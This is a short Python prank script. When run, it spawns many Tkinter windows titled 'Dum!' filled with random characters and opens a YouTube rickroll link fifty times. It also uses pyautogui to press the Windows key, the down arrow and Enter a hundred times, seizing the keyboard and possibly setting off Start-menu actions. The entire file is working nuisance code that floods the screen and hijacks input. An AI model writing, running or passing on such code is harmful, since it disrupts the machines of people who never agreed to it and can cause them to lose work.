import tkinter as tk
import random
import string
import time
import webbrowser
import threading
import pyautogui

a = string.ascii_letters + string.digits + string.punctuation

def main():
    time.sleep(2)
    root = tk.Tk()
    root2 = tk.Tk()
    root.title('Dum!')
    root2.title('Dum!')
    text = tk.Text(root, height=8)
    text2 = tk.Text(root2, height=8)
    text.pack()
    text2.pack()
    for i in range(1000):
        text.insert('1.0', random.choice(a))
        text2.insert('1.0', random.choice(a))
    root.mainloop()
    root2.mainloop()

def rain():
    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

tall = 100

def pain():
    for i in range(tall):
        pyautogui.press('win')
        pyautogui.press('down')
        time.sleep(.5)
        pyautogui.press('down')
        pyautogui.press('enter')
    

threads = []
count = 0

for i in range(tall):
    b = threading.Thread(target=main)
    h = threading.Thread(target=rain)
    h.daemon = True
    b.daemon = True
    if count < tall // 2:
        threads.append(h)
    threads.append(b)
    count += 1

for i in range(tall):
    threads[i].start()

k = threading.Thread(target=pain)
k.daemon = True
k.start()


for i in range(tall):
    threads[i].join()
    
k.join()
